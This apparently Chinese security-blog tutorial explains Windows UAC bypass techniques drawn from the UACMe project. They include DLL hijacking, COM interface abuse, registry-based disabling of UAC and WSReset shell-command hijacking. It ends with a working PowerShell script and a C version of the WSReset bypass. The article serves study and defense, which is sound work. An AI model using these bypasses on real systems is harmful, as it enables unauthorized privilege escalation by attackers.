sysprep.exe在运行时会加载dependency设置的dll，比如name“Microsoft.Windows.Common-Controls”的对应的dll为comctl32.dll，sysprep.exe会加载C:\windwos\winsxs中的comctl32.dll，而不是加载system32下的dll。

但是在加载winsxs下的dll之前，windows会先应用Dotlocal机制去查找dll，这个机制也是MS推出的为了解决兼容性问题的一个机制，exe会首先检查当前目录下有没有sysprep.exe.local的文件夹，如果有则在该文件夹中寻找dll

    
    
    C:\Windows\System32\sysprep\sysprep.exe.local\amd64microsoft.windows.common-controls6595b64144ccf1df6.0.7601.18837none_fa3b1e3d17594757\comctl32.dll
    

若没有则会从winsxs下寻找dll

    
    
    C:\Windows\winsxs\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.18837_none_fa3b1e3d17594757\comctl32.dll
    

所以,我们bypassUAC的思路也就出来了:

  1. C:\windows\system32\sysprep\下新建文件夹sysprep.exe.local\amd64microsoft.windows.common-controls6595b64144ccf1df6.0.7601.18837none_fa3b1e3d17594757\
  2. 在该文件夹下写入comctl32.dll
  3. 运行sysprep.exe进行DLL劫持

对应21号方法:

    
    
    Author: Leo Davidson derivative
        Type: Dll Hijack
        Method: IFileOperation, SxS DotLocal
        Target(s): \system32\sysprep\sysprep.exe
        Component(s): comctl32.dll
        Implementation: ucmSXSMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 RS3 (16232)
            How: MitigationPolicy->ProcessImageLoadPolicy->PreferSystem32Images
    

当然也可以选择劫持其他程序

#####  通过代码注入绕过UAC

第14号方法使用了这种技术

    
    
    Author: Leo Davidson, WinNT/Sirefef derivative
        Type: Dll Hijack
        Method: IFileOperation
        Target(s): \system\credwiz.exe, \system32\wbem\oobe.exe
        Component(s): netutils.dll
        Implementation: ucmSirefefMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 TH2 (10548)
            How: AppInfo elevated application path control hardening
    

具体操作流程如下：

  1. 将payloadDll(Fubuki)使用IFileOperation拷贝C:\Windows\system32\wbem\netutils.dll
  2. 将C:\Windows\system32\credwiz.exe 拷贝到Temp目录下命名为oobe.exe
  3. 将Temp\oobe.exe使用IFileOperation拷贝到C:\Windows\system32\wbem\oobe.exe
  4. 启动credwiz.exe(以挂起模式CREATE_SUSPENDED启动)并向其进程注入shellcode(向credwiz中注入的代码是ucmxElevatedLaunchProc函数的代码)
  5. ucmElevatedLaunchProc中执行ShellExec (以runas方式执行)启动C:\Windows\system32\wbem\oobe.exe，该可执行程序存在DLL劫持，C:\Windows\system32\wbem\netutils.dll得以运行，进而绕过UAC
  6. 清理system32\wbem下的数据

其中ucmxElevatedLaunchProc的代码如下:

    
    
    DWORD WINAPI ucmxElevatedLaunchProc(
        _In_ LOAD_PARAMETERS *Params
    )
    {
        SHELLEXECUTEINFOW shexec;
    
        shexec.cbSize = sizeof(shexec);
        shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
        shexec.nShow = SW_SHOW;
        shexec.lpVerb = Params->szVerb;
        shexec.lpFile = Params->szTargetApp;
        shexec.lpParameters = NULL;
        shexec.lpDirectory = NULL;
        if (Params->ShellExecuteExW(&shexec))
            if (shexec.hProcess != NULL) {
                Params->WaitForSingleObject(shexec.hProcess, INFINITE);
                Params->CloseHandle(shexec.hProcess);
            }
    
        return Params->RtlExitUserThread(STATUS_SUCCESS);
    }
    

其参数在

    
    
    RtlSecureZeroMemory(LoadParams, sizeof(LOAD_PARAMETERS));
    
            _strcpy(LoadParams->szVerb, RUNAS_VERB);
    
            _strcat(szB1, OOBE_EXE);
            _strncpy(LoadParams->szTargetApp, MAX_PATH, szB1, MAX_PATH);
    
            LoadParams->ShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(
                g_ctx->hShell32,
                "ShellExecuteExW");
    
            LoadParams->WaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(
                g_ctx->hKernel32,
                "WaitForSingleObject");
    
            LoadParams->CloseHandle = (pfnCloseHandle)GetProcAddress(
                g_ctx->hKernel32,
                "CloseHandle");
    
            LoadParams->RtlExitUserThread = (pfnRtlExitUserThread)GetProcAddress(
                g_ctx->hNtdll,
                "RtlExitUserThread");
    

这里被构造,然后通过`Status = RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0,
0,(PUSER_THREAD_START_ROUTINE)newEp, newDp,&hRemoteThread, NULL);` 传递过去

#####  关闭UAC机制

该方法第一次被使用是在一个叫Simda的恶意软件中。

这个方法有一个缺点，需要重启系统才能成功关闭UAC。

该方法利用微软没有公开的ISecurityEditor COM对象，该对象和IFileOperation
COM对象类似，是一个AutoElevate的COM对象，在白名单进程中使用可以自动提升权限。

这个对象可以用于修改注册表的访问权限，攻击者可以伪装白名单进程然后修改如下注册表权限为可写

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

然后设置EnableLUA为0 （EnableLUA REG_DWORD 0）即可关闭UAC。

![](https://p1.ssl.qhimg.com/t014e21641f62f41669.png)

5号方法用的就是这种手法:

    
    
    Author: WinNT/Simda
        Type: Elevated COM interface
        Method: ISecurityEditor
        Target(s): HKLM registry keys
        Component(s): -        Implementation: ucmSimdaTurnOffUac
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 TH1 (10147)
            How: ISecurityEditor interface method changed
    

关键代码如下:

![](https://p5.ssl.qhimg.com/t01d1f97e8687daefa0.png)

  1. 使用ISecurityEditor修改上述注册表权限为可写
  2. 新建/修改注册表键EnableUA的值为0
  3. 重启系统，成功关闭UAC

#####  使用注册表制定程序加载DLL

该方法同样使用ISecurityEditor
COM，修改的注册表项为，将其访问权限改为可写,然后在`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options`表项后新建子项cliconfg.exe,在子项下增加键值对:

    
    
    GlobalFlag REG_DWORD 0x0000100   
    VerifierDlls REG_SZ Hibiki.dll
    

VerifierDlls的值为dll的名字，该dll为攻击者自定义dll，该DLL需要放置在C:\Windows\system32下。VerifierDlls中存储的DLL会被AppVerfier（应用程序检验器）使用。

通过WUSA将攻击者自动以DLL解压至C:\windwos\system32\Hibiki.dll下，然后运行cliconfg.exe即可在运行时自动加载Hibiki.dll，因为cliconfg.exe是AutoElevate的exe，所以Hiibiki.dll会以管理员权限运行，即绕过了UAC。

方法9使用了该技术:

    
    
    Author: Leo Davidson, WinNT/Simda, Win32/Carberp derivative
        Type: Dll Hijack
        Method: IFileOperation, ISecurityEditor, WUSA
        Target(s): IFEO registry keys, \system32\cliconfg.exe
        Component(s): Attacker defined Application Verifier Dll
        Implementation: ucmAvrfMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 TH1 (10147)
            How: WUSA /extract option removed, ISecurityEditor interface method changed
    

注意,由于是使用的WUSA来进行转移,所以同样也要构造一个cab格式的文件.

以上就是常见的通过DLL劫持的方式来BypassUAC的方法.

###  利用COM接口

####  COM简介

COM是Component Object Model （组件对象模型）的缩写。
COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。

#####  应用程序与COM注册表的关系 – CLSID

首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。

CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。位置在注册表的
_HKEY_CLASSES_ROOT\CLSID_
，这里存放了Windows系统组件对应的CLSID，选中某个CLSID，在右侧窗格中的“默认”值显示的“数据”即为该CLSID对应的系统组件名称，例如{26EE0668-A00A-44D7-9371-BEB064C98683}就是“控制面板”的CLSID。

![](https://p1.ssl.qhimg.com/t017f34113c5e0f5ac2.png)

可以有以下应用方式：

  * **方式一：** Win + R 快捷键调出“运行”对话框，输入 shell:::CLSID（例如 shell:::{26EE0668-A00A-44D7-9371-BEB064C98683} ），确定，即可打开“控制面板”（不是在cmd中）
  * **方式二：** 创建快捷方式。在创建快捷方式时，只需在“请键入对象的位置”文本框中输入 explorer shell:::CLSID（例如explorer shell:::{26EE0668-A00A-44D7-9371-BEB064C98683} ），那么使用创建的快捷方式打开“控制面板”；
  * **方式三：** 你也可以把某个系统组件的CLSID嵌入到应用软件中，以快速打开某组件；

####  利用可以Auto Approval的COM组件BypassUAC

对于这类BypassUAC，需要满足以下两点：

  1. elevation属性开启，且开启Auto Approval(需要利用这个特点绕过UAC)
  2. COM组件中的接口存在可以命令执行的地方(用来执行我们自己的命令)

举个例子，如41号方法：

    
    
    Author: Oddvar Moe
        Type: Elevated COM interface
        Method: ICMLuaUtil
        Target(s): Attacker defined
        Component(s): Attacker defined
        Implementation: ucmCMLuaUtilShellExecMethod
        Works from: Windows 7 (7600)
        Fixed in: unfixed 🙈
            How: -    

这个方法使用的是CMSTPLUA组件的ICMLuaUtil接口，我们对着上述两个特点看一下

这里建议下载一个[OleViewDotNet](https://github.com/tyranid/oleviewdotnet)工具，可以方便的查看系统中的COM接口属性信息，注意需要用管理员权限运行

Registry -> CLSIDs

![](https://p2.ssl.qhimg.com/t01eec52d0f8141026b.png)

在CLSID上右键 -> properties -> Elevation 可以看到该接口Enabled：True&Auto
Approval：True,满足上述第一个条件

![](https://p4.ssl.qhimg.com/t01d359ecce95af3440.png)

鼠标悬浮在ICMLuaUtil上,可以看到虚函数表地址在cmlua.dll+0x7360的位置处

![](https://p2.ssl.qhimg.com/t013bb0c3fd19f8f5e3.png)

用IDA打开看一下,找到0x180007360的位置,可以看到ICMLuaUtil接口的虚函数表

![](https://p0.ssl.qhimg.com/t01b6610f06579b2e87.png)

满足了第二个条件,即通过调用`ShellExecuteEx`这个`Windows API`实现了命令执行

我们具体看一下实现过程:

关键代码在Source\Akagi\methods\api0cradle.c中的ucmCMLuaUtilShellExecMethod函数中定义,同样,调用该函数前需要用supMasqueradeProcess伪装成白名单,关键函数如下:

    
    
    NTSTATUS ucmCMLuaUtilShellExecMethod(
        _In_ LPWSTR lpszExecutable
    )
    {
        NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
        HRESULT          r = E_FAIL, hr_init;
        BOOL             bApprove = FALSE;
        ICMLuaUtil      *CMLuaUtil = NULL;
    
        hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); //初始化当前线程Com组件
          ......
    
            r = ucmAllocateElevatedObject(
                T_CLSID_CMSTPLUA,
                &IID_ICMLuaUtil,
                CLSCTX_LOCAL_SERVER,
                (void**)&CMLuaUtil);
    
                ......
    
            r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
                lpszExecutable,
                NULL,
                NULL,
                SEE_MASK_DEFAULT,
                SW_SHOW);
              ......
    
        if (CMLuaUtil != NULL) {
            CMLuaUtil->lpVtbl->Release(CMLuaUtil);
        }
    
        if (hr_init == S_OK)
            CoUninitialize();
    
        return MethodResult;
    }
    

ucmAllocateElevatedObject中用CoGetObject创建了一个以管理员权限运行的CMLuaUtil组件

然后用ShellExec传进来的lpszExecutable,也就是payload:

    
    
        if (g_ctx->OptionalParameterLength == 0)
            lpszParameter = g_ctx->szDefaultPayload;
        else
            lpszParameter = g_ctx->szOptionalParameter;
    return ucmCMLuaUtilShellExecMethod(lpszParameter);
    

定义在sup.c中,就是一行简单滴调用cmd.exe的命令

![](https://p2.ssl.qhimg.com/t013c3e19f3eec377b9.png)

#####  寻找这类可利用接口

除了通过上面的方式在`OleView`中手动去找，还可以通过`UACMe`项目提供的`Yuubari`工具快速查看系统`UAC`设定信息以及所有可以利用的程序和`COM`组件,这个工具的使用上文已经详细说明了,这里我们来看一下日志内容,挑几个重点的说:

    
    
    ===============================================================
    [UacView] Basic UAC settings
    ===============================================================
    ElevationEnabled=Enabled
    VirtualizationEnabled=Enabled
    InstallerDetectEnabled=Enabled
    ConsentPromptBehaviorAdmin=5
    EnableSecureUIAPaths=1
    PromptOnSecureDesktop=Enabled
    

显示基本的UAC配置

    
    
    ===============================================================
    [UacView] Autoelevated COM objects
    ===============================================================
    EditionUpgradeHelper Class
    EditionUpgradeHelper
    \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{01776DF3-B9AF-4E50-9B1C-56E93116D704}
    
    
    CEIPLuaElevationHelper
    wercplsupport.dll
    Customer Experience Improvement Program
    \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{01D0A625-782D-4777-8D4E-547E6457FAD5}
    

罗列所有可以自动权限提升的COM对象

    
    
    ===============================================================
    [UacView] Autoelevated applications in Windows directory
    ===============================================================
    
    C:\Windows\System32\BitLockerWizardElev.exe
    requireAdministrator
    uiAccess=FALSE
    autoElevate=TRUE
    

罗列所有可以自动提升权限的应用(在windows目录下的)

####  劫持COM组件绕过UAC

这种方式的原理在于CLSID下的两个键名:InprocHandler32和InprocServer32:

  * InprocHandler32:指定应用程序使用的自定义处理程序
  * InprocServer32:注册32位进程所需要的模块、线程属性配置

    
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   
         {CLSID}       
        InprocServer32          (Default) = path          
        ThreadingModel         = value
    

![](https://p0.ssl.qhimg.com/t01520b2e6d9d423189.png)

#####  COM组件的加载过程

  1. HKCU\Software\Classes\CLSID
  2. HKCR\CLSID
  3. HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\

所以我们可以通过在COM组件注册表下创建InprocServer32键值并将其指向我们自己的payload DLL来实现COM组件的劫持

40号方法就是使用这种技术:

    
    
    Author: Ruben Boonen
        Type: COM Handler Hijack
        Method: Registry key manipulation
        Target(s): \system32\mmc.exe, \system32\recdisc.exe
        Component(s): Attacker defined
        Implementation: ucmCOMHandlersMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 19H1 (18362)
            How: Side effect of Windows changes
    

流程如下:

  1. 将payload DLL先复制到temp下
  2. 在CLSID/{0A29FF9E-7F9C-4437-8B11-F424491E3931}下创建InprocServer32并将值指向刚刚解压出来的dll文件,ThreadingModel的值为Apartment
  3. 创建ShellFolder,把HideOnDesktopPerUser值改为空,把Attributes值改为0xF090013D,这是”combination of SFGAO flags”
  4. 用mmc.exe运行eventvwr.msc,即可完成劫持.
  5. 清理注册表

###  利用Shell API

这种方法主要是通过寻找autoElevated属性为true的程序,修改其注册表\shell\open\command的值,改成我们想要执行的paylaod,在该值中指明的字段会在这类程序运行时自动执行,类似于默认程序打开,当你以后运行该程序时,这个command命令都会自动执行

UACME原本项目中的方法…我尝试的时候有点bug,不知道是我系统的问题还是什么问题,后续研究一下..这里给一个win10仍可用的payload,利用到了WSReset.exe这个应用商店的程序,利用思路如下:

  1. 更改HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command的值为”C:\Windows\System32\cmd.exe /c start cmd.exe”
  2. 运行WSReset.exe
  3. 清理注册表

将大佬原本的ps版本payload稍作修改:

    
    
    <#
    .SYNOPSIS
    Fileless UAC Bypass by Abusing Shell API
    
    Author: Hashim Jawad of ACTIVELabs
    
    .PARAMETER Command
    Specifies the command you would like to run in high integrity context.
    
    .EXAMPLE
    Invoke-WSResetBypass -Command "C:\Windows\System32\cmd.exe /c start cmd.exe"
    
    This will effectivly start cmd.exe in high integrity context.
    
    .NOTES
    This UAC bypass has been tested on the following:
     - Windows 10 Version 1803 OS Build 17134.590
     - Windows 10 Version 1809 OS Build 17763.316
    #>
    
    function Invoke-WSResetBypass {
          Param (
          [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
          )
    
          $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
          $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
          New-Item $CommandPath -Force | Out-Null
          New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
          Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
          Write-Host "[+] Registry entry has been created successfully!"
    
          $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
          Write-Host "[+] Starting WSReset.exe"
    
          Write-Host "[+] Triggering payload.."
          Start-Sleep -Seconds 10
    
          if (Test-Path $filePath) {
          Remove-Item $filePath -Recurse -Force
          Write-Host "[+] Cleaning up registry entry"
          }
    }
    IEX Invoke-WSResetBypass;
    

用法`POWERSHELL -EXECUTIONPOLICY BYPASS -FILE
C:\Users\User\Desktop\BypassUAC.ps1`

改成C版本:

    
    
    #include <stdio.h>
    #include <windows.h>
    
    int main(void)
    {
        LPCWSTR regname = L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open";
        HKEY hkResult = NULL;
        const wchar_t * payload = L"C:\\Windows\\System32\\cmd.exe /c start cmd.exe";
        DWORD Len = wcslen(payload)*2 + 2;
    
        int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hkResult);
    
        ret = RegSetValueEx(hkResult, L"command", 0, REG_SZ, (BYTE*)payload, Len);
        if (ret == 0) {
            printf("success to write run key\n");
            RegCloseKey(hkResult);
        }
        else {
            printf("failed to open regedit.%d\n", ret);
            return 0;
        }
        printf("Starting WSReset.exe");
        system("C://Windows//System32//WSReset.exe");
        return 0;
    }
    

实际在测试的时候,我的Win10(10.0.19041.329)没有成功,似乎是我的注册表之前被改坏了,但是这种思路就是这样是没有问题的,大名鼎鼎的冰河木马和灰鸽子都是采用类似的方式来执行自己的exe的.

UACMe中还是有很多没有被修复的BypassUac的方法的,在实际使用中要结合具体的情况来选取使用的方式,msf中也有多种BypassUac的方法可以使用.BypassUac的方法比较多,单思路来说,大体思路都在上述的总结中了,目前为止这应该是相对比较全面的一片BypassUac的方法总结了,有任何有问题的地方,请各位大佬指正.

## 参考

  * <https://www.secpulse.com/archives/68255.html>
  * <https://cloud.tencent.com/developer/article/1623517>
  * <https://payloads.online/archivers/2018-12-22/1#0x00-%E5%89%8D%E8%A8%80>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Gality** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/216808](/post/id/216808)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [BypassUAC](/tag/BypassUAC)

 **+1** __9赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) Gality

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

